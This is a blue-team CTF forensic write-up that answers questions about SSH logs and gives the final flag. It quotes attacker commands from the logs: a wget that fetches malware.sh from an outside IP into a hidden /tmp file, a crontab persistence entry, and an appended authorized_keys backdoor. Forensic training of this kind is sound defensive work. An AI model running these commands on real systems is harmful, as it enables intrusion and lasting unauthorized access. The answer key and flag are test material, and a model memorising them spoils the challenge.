---
title: "CyberSpark CTF — Backdoor"
date: 2025-05-18
side: "blue"
summary: "Analyzing SSH logs to uncover unauthorized access and a malware persistence mechanism."
tags: ["dfir", "log-analysis", "authored"]
---
## Challenge Description

This beginner-level forensic challenge focuses on analyzing SSH logs to uncover attacker behavior. Participants are required to identify unauthorized access, malware persistence mechanisms, and retrieve the final flag by answering key questions derived from SSH activity.

---

## Questions & Answers

### How many different IPs attempted to connect to the SSH server?

**Answer:** 4

- `194.87.112.101`
- `185.243.112.44`
- `92.134.56.10`
- `192.168.1.15`

---

### Which user account was successfully compromised?

**Answer:** support

> Successful login recorded:
> 
> 
> `Accepted password for support from 185.243.112.44 port 49876 ssh2`
> 

---

### What port was used in the attacker's first successful login?

**Answer:** 49876

> Seen in log entry:
> 
> 
> `Accepted password for support from 185.243.112.44 port 49876 ssh2`
> 

---

### What command was used to download a file from the attacker's server?

**Answer:** `wget <http://185.243.112.44/malware.sh> -O /tmp/.systemd`

---

### What file did the attacker try to hide by adding it to the crontab?

**Answer:** `/tmp/.systemd`

> Crontab entry seen:
> 
> 
> `echo "* * * * * /tmp/.systemd" | crontab -`
> 

---

### What command did the attacker use to maintain persistence on the system?

**Answer:**

```bash
echo 'ssh-rsa AAAAC3NzaC1lZDI1NTE5AAAAIDZ3X9q3X5f8y5gZ3X9q3X5f8y5gZ3X9q3X5f8y5gZ3X user@attack' >> ~/.ssh/authorized_keys

```

---

### What user executed a legitimate git pull command?

**Answer:** jdoe

> Normal user activity:
> 
> 
> `git pull origin production`
> 
> Seen after public key login from internal IP `192.168.1.15`
> 

---

## Skills Learned

- 🧠 **Log Analysis**: Practiced parsing SSH logs to trace unauthorized access and user commands.
- 📌 **Threat Hunting**: Identified indicators of compromise like suspicious IPs, unauthorized file downloads, and persistence tactics.
- 🛠️ **Persistence Mechanisms**: Learned how attackers use `crontab` and `authorized_keys` to maintain access.
- 🧩 **Attribution**: Distinguished legitimate vs. malicious user actions based on command context and login sources.

---

## Flag
Spark{G00d_j0b_Re4ding_l0gs}
